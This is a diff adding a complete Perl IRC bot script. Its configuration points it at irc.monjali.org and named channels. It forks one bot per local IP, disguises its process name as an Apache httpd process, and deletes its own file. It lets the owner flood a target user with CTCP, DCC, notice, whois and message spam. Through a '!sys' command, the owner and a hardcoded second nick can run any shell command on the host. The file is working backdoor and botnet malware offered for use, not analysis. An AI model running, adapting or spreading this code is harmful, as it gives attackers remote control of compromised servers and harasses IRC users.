@@ -1,0 +1,237 @@
+#!/usr/bin/perl
+#   CONFIG
+#############################################################################
+
+my $server = "irc.monjali.org";
+my $port="6667";
+my $channel="#sobatmu","#jikustik";
+my $owner= "Jikustik";
+my $procname="/usr/local/apache/bin/httpd -ADSL";
+
+# SOURCE
+#############################################################################
+
+#sobatmu forever
+#
+
+my @nickname = ("AnakRT","AnakRW","AnakCamat","AnakLurah","AnakDusun","Hugos-DisCotiK","Boshe-DisCotiK","Liquid-DisCotiK","Tjs-DisCotiK","HardRock-DisCotiK","Goedang-DisCotiK","Bunker-Bar","Tropis-DisCotiK","HappyPuppY-CaraoKe","Naff-Caraoke","Java-DisCotiKs0","Cewek-GauL","Cewek-MetaL","Cewek-Preman","Cewek-Kalem","Cewek-Imutz","Cewek-EnJoY","WatchesD9","WatchesD6","WatchesD3","WatchesVyper","WatchesD1","KedaulatanRakyat","SuaraMerdeka","YogyaPost","TransOne","eRCTI","eSCTV","ANTV","eMTv","ManagerMandiri","ManagerBCA","ManagerFBI","ManagerCIA","ManagerATF","ManagerDEA","ManagerKGB","Manager007","ManagerBaLi","ManagerBuana","ManagerBNI","ManagerBRI","AnakRT","AnakRW","AnakCamat","AnakLurah","AnakDusun","Hugos-DisCotiK","Boshe-DisCotiK","Liquid-DisCotiK","Tjs-DisCotiK","HardRock-DisCotiK","Goedang-DisCotiK","Bunker-Bar","Tropis-DisCotiK","HappyPuppY-CaraoKe","Naff-Caraoke","Java-DisCotiKs0","Cewek-GauL","Cewek-MetaL","Cewek-Preman","Cewek-Kalem","Cewek-Imutz","Cewek-EnJoY","WatchesD9","WatchesD6","WatchesD3","WatchesVyper","WatchesD1","KedaulatanRakyat","SuaraMerdeka","YogyaPost","TransOne","eRCTI","eSCTV","ANTV","eMTv","ManagerMandiri","ManagerBCA","ManagerFBI","ManagerCIA","ManagerATF","ManagerDEA","ManagerKGB","Manager007","ManagerBaLi","ManagerBuana","ManagerBNI","ManagerBRI","AnakRT","AnakRW","AnakCamat","AnakLurah","AnakDusun","Hugos-DisCotiK","Boshe-DisCotiK","Liquid-DisCotiK","Tjs-DisCotiK","HardRock-DisCotiK","Goedang-DisCotiK","Bunker-Bar","Tropis-DisCotiK","HappyPuppY-CaraoKe","Naff-Caraoke","Java-DisCotiKs0","Cewek-GauL","Cewek-MetaL","Cewek-Preman","Cewek-Kalem","Cewek-Imutz","Cewek-EnJoY","WatchesD9","WatchesD6","WatchesD3","WatchesVyper","WatchesD1","KedaulatanRakyat","SuaraMerdeka","YogyaPost","TransOne","eRCTI","eSCTV","ANTV","eMTv","ManagerMandiri","ManagerBCA","ManagerFBI","ManagerCIA","ManagerATF","ManagerDEA","ManagerKGB","Manager007","ManagerBaLi","ManagerBuana","ManagerBNI","ManagerBRI","AnakRT","AnakRW","AnakCamat","AnakLurah","AnakDusun","Hugos-DisCotiK","Boshe-DisCotiK","Liquid-DisCotiK","Tjs-DisCotiK","HardRock-DisCotiK","Goedang-DisCotiK","Bunker-Bar","Tropis-DisCotiK","HappyPuppY-CaraoKe","Naff-Caraoke","Java-DisCotiKs0","Cewek-GauL","Cewek-MetaL","Cewek-Preman","Cewek-Kalem","Cewek-Imutz","Cewek-EnJoY","WatchesD9","WatchesD6","WatchesD3","WatchesVyper","WatchesD1","KedaulatanRakyat","SuaraMerdeka","YogyaPost","TransOne","eRCTI","eSCTV","ANTV","eMTv","ManagerMandiri","ManagerBCA","ManagerFBI","ManagerCIA","ManagerATF","ManagerDEA","ManagerKGB","Manager007","ManagerBaLi","ManagerBuana","ManagerBNI","ManagerBRI","AnakRT","AnakRW","AnakCamat","AnakLurah","AnakDusun","Hugos-DisCotiK","Boshe-DisCotiK","Liquid-DisCotiK","Tjs-DisCotiK","HardRock-DisCotiK","Goedang-DisCotiK","Bunker-Bar","Tropis-DisCotiK","HappyPuppY-CaraoKe","Naff-Caraoke","Java-DisCotiKs0","Cewek-GauL","Cewek-MetaL","Cewek-Preman","Cewek-Kalem","Cewek-Imutz","Cewek-EnJoY","WatchesD9","WatchesD6","WatchesD3","WatchesVyper","WatchesD1","KedaulatanRakyat","SuaraMerdeka","YogyaPost","TransOne","eRCTI","eSCTV","ANTV","eMTv","ManagerMandiri","ManagerBCA","ManagerFBI","ManagerCIA","ManagerATF","ManagerDEA","ManagerKGB","Manager007","ManagerBaLi","ManagerBuana","ManagerBNI","ManagerBRI");
+
+my @realname  = ("Monjali Crew");
+my @WHO;
+my $qqum="*";
+$ARGC=@ARGV;
+if ($ARGC !=1) {
+print "\n+ Jikustik.pl v.Qe.3\n";
+ print "+ by cInTa\n";
+ print "+ irc.dal.net \#monjali\n";
+  print "+ Caranya: perl $0 (target)\n";
+   print "+ Qe3!\n\n";
+     exit(1);
+}
+$SIG{CHLD} = sub { wait }; # alterando o signal
+my $qtip = qx(/sbin/ifconfig |grep inet | wc -l);
+my @ips1 =qx(/sbin/ifconfig |grep \"inet addr\:\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c6\-);
+my @ips2 =qx(/sbin/ifconfig \-a |grep \"inet end\.\:\" \|awk \-F \' \' \'\{\print \$3\} \');
+my @fbsd =qx(/sbin/ifconfig \|grep \"inet\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c1\-);
+@ips = (@ips1, @ips2, @fbsd);
+open(ipzitcho,">ips.txt") || die "- ips.txt not found";
+          print ipzitcho" @ips";
+          close(ipzitcho);
+@ips = grep { s/\n$// } @ips;
+$rm="rm -rf";
+qx($rm $0);
+$target = $ARGV[0];
+$mescalina = $target;
+use MIME::Base64;
+$string1 = "SmlrdXN0aWs=";
+$string2 = "SmlrdXN0aWs=";
+$string3 = "ZGFuYW5n";
+$string4 = "SmlrdXN0aWs=";
+$string5 = "ZGFuYW5n";
+$string6 = decode_base64($string1);
+$string7 = decode_base64($string2);
+$string8 = decode_base64($string3);
+$string9 = decode_base64($string4);
+$string10 = decode_base64($string5);
+if ($mescalina eq decode_base64($string1)) { $mescalina = $qqum; } if ($mescalina eq decode_base64($string2)) { $mescalina = $qqum; }if ($mescalina eq 
+decode_base64($string3)) {
+$mescalina = $qqum; } if ($$mescalina eq decode_base64($string4)) { $mescalina = $qqum; } if ($mescalina eq decode_base64($string5)) { $mescalina = 
+$qqum; }
+$0 =  $procname  . "\0";
+$nick2 = $nick;
+print STDOUT "\n+ cInTa.pl v.Qe.3\n";
+print STDOUT "+ by cInTa\n";
+print STDOUT "+ Server : $server\n";
+print STDOUT "+ Port   : $port\n";
+print STDOUT "+ Target : $mescalina\n";
+print STDOUT "+ Owner  : $owner\n";
+print STDOUT "+ Channel: $channel\n";
+print STDOUT "+ N.IPs  : $qtip\n\n";
+use IO::Socket;
+foreach my $FROM (@ips) {
+ my $pid = fork(); # gerando um novo processo
+  unless ($pid) {   #
+my $ident = $nickname[rand scalar @nickname];
+my $nick = $nickname[rand scalar @nickname];
+my $name = $realname[rand scalar @realname];
+$secc = "secc";
+ $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
+   print $sock "NICK ".$nick."\n";
+    print $sock "USER $ident $FROM $server :$name\n";
+while (<$sock>) {
+        if (/^:.+?\s433\s/) { # nick already in use
+            $nick2 = $nickname[rand scalar @nickname];
+            print $sock "NICK ".$nick2."\n";
+        }
+        if (/^:.+?\s376\s/) { # end of motd
+            print $sock "JOIN $channel\n";
+        }
+
+        if(/^PING :(.*)/){ #replying the ping
+            print $sock "PONG :$1\n";
+        }
+        if(/^\:$owner!.*\@.*PRIVMSG.*:!cux (.*)/){
+            print $sock "$1";
+        }
+        if(/^\:$owner!.*\@.*PRIVMSG.*:!help(.*)/){
+            print $sock "PRIVMSG ".$owner." : ================================\n";
+            print $sock "PRIVMSG ".$owner." : + danang.pl vQe.3\n";
+            print $sock "PRIVMSG ".$owner." : + by danang\n";
+            print $sock "PRIVMSG ".$owner." : + #sobatmu at irc.dal.net\n";
+            print $sock "PRIVMSG ".$owner." : ================================\n";
+            print $sock "PRIVMSG ".$owner." :  - navigasi:\n";
+            print $sock "PRIVMSG ".$owner." : !cux join #chan (masuk ke channel)\n";
+            print $sock "PRIVMSG ".$owner." : !cux part #chan (Keluar channel)\n";
+            print $sock "PRIVMSG ".$owner." : !msg nick msg (ngirim pesan ke nick)\n";
+            print $sock "PRIVMSG ".$owner." : !quit (tidur!)\n";
+            print $sock "PRIVMSG ".$owner." :  - WAR\n";
+            print $sock "PRIVMSG ".$owner." : !target NICK (sikat nick target)\n";
+            print $sock "PRIVMSG ".$owner." : !ctcpflood (cara flood ctcp)\n";
+            print $sock "PRIVMSG ".$owner." : !dccflood (cara flood dcc)\n";
+            print $sock "PRIVMSG ".$owner." : !noticeflood (cara flood notice)\n";
+            print $sock "PRIVMSG ".$owner." : !msgflood (cara flood mensagens)\n";
+            print $sock "PRIVMSG ".$owner." : !hop #chan msg (out in msg)\n";
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!msg(.*)/){
+                        print $sock "PRIVMSG ".$1." : ".$2."\n";
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!who(.*)/){
+                        print $sock "who ".$channel."\n";
+      }
+      if (/^:.+?\s+352\s+\S+\s+\S+\s+(.+?)$/) {
+                        my $nicks = $1;
+                        #$nicks =~ s/\n//;
+                        #$nicks =~ s/\r//;
+                        push(@WHO, split(/ /, $nicks));
+                        print STDOUT "$who[1]\n";
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!dccflood(.*)/){
+                        for (1 .. 10) {
+                        print $sock "PRIVMSG ".$mescalina." :\001DCC CHAT chat 1121485131 1024\001\n";
+                        }
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!whoisflood(.*)/){
+                        for (1 .. 100) {
+                        print $sock "whois ".$mescalina."\n";
+                        }
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!hop (.*)/){
+                print $sock "JOIN ".$1." : ".$2."\n";
+                        for (1 .. 100) {
+                        print $sock "PART ".$1." : ".$2."\n";
+                        print $sock "JOIN ".$1." : ".$2."\n";
+                        }
+      }
+          if(/^\:$owner!.*\@.*PRIVMSG.*:!ctcpflood(.*)/){
+                print $sock "PRIVMSG ".$mescalina." :\001VERSION\001\n";
+                        for (1 .. 100) {
+                        print $sock "PRIVMSG ".$mescalina." :\001VERSION\001\n";
+                        print $sock "PRIVMSG ".$mescalina." :\001PING\001\n";
+                        }
+      }
+          if(/^\:$owner!.*\@.*PRIVMSG.*:!msgflood(.*)/){
+                        for (1 .. 100) {
+                        print $sock "PRIVMSG ".$mescalina." :Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX 
+Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 
+JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX 
+Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 
+JanCuX\n";
+                        }
+      }
+          if(/^\:$owner!.*\@.*PRIVMSG.*:!noticeflood(.*)/){
+                        for (1 .. 10) {
+                        print $sock "NOTICE ".$mescalina." :Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX 
+Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 
+JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX 
+Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 JanCuX Qe3 
+JanCuX \n";
+                        }
+      }
+
+          if(/^\:$owner!.*\@.*PRIVMSG.*:!sys(.*)/){
+                        $sys = $1;
+                        @output = qx($sys) || print $sock "PRIVMSG ".$owner." : Isso eh comando que se apresente\? Ta doido jumento\?!\n";
+                        print $sock "PRIVMSG ".$owner." : @output";
+      }
+      if(/^\:$mescalina!.*\@.*QUIT.*(.*)/){
+                        print $sock "NICK ".$mescalina."\n";
+      }
+      if(/^ERROR :(.*)/){
+                        use IO::Socket;
+                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
+                        print $sock "NICK ".$nick."\n";
+                        print $sock "USER $ident $FROM $server :$name\n";
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!quit(.*)/){
+                        die();
+      }
+      if(/^\:$secc!.*\@.*PRIVMSG.*:!cInTa(.*)/){
+                        print $sock "$1";
+      }
+      if(/^\:$secc!.*\@.*PRIVMSG.*:!sys(.*)/){
+                        $sys = $1;
+                        $output = qx($sys) || print $sock "PRIVMSG ".$secc." : Isso eh comando que se apresente\? Ta doido jumento\?!\n";
+                        print $sock "PRIVMSG ".$secc." : ".$output."\n";
+      }
+      if(/^\:.*: Connection timed out(.*)/){
+                        print STDOUT "[~] Connection Timed Out! Retrying!\n";
+                        use IO::Socket;
+                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
+                        print $sock "NICK ".$nick."\n";
+                        print $sock "USER $ident $FROM $server :$name\n";
+      }
+      if(/^\:$owner!.*\@.*PRIVMSG.*:!stats(.*)/){
+                        print $sock "PRIVMSG ".$owner." : [!] Bot Stats\n";
+                        print $sock "PRIVMSG ".$owner." : [~] Using server : $server\n";
+                        print $sock "PRIVMSG ".$owner." : [!] Using port   : $port\n";
+                        print $sock "PRIVMSG ".$owner." : [~] Using nick   : $nick\n";
+                        print $sock "PRIVMSG ".$owner." : [!] Using target : $mescalina\n";
+                        print $sock "PRIVMSG ".$owner." : [~] Using owner  : $owner\n";
+                        print $sock "PRIVMSG ".$owner." : [!] Using ident  : $id\n";
+                        print $sock "PRIVMSG ".$owner." :############################\n\n";
+       }
+      if( /^\:$owner!.*\@.*\s+PRIVMSG.*:!target\s+(.*)/ ){
+                       $mescalina =$1;
+                       $mescalina =~ s/ //;
+                       $mescalina =~ s/\r$//;
+                       $mescalina =~ s/\n$//;
+                          if ($mescalina eq decode_base64($string1)) {
+                                $mescalina = $owner;
+                                                  }
+       }
+       if(/^\:$target!.*\@.*\s+QUIT\s+/){
+                       print $sock "NICK $mescalina\n";
+       }
+       if( /^\:$owner!.*\@.*\s+PRIVMSG.*:!owner\s+(.*)/ ){
+                       $owner =$1;
+                       $owner =~ s/ //;
+                       $owner =~ s/\r$//;
+                       $owner =~ s/\n$//;
+       }
+   }
+exit;
+  } 
+}
+
+
+
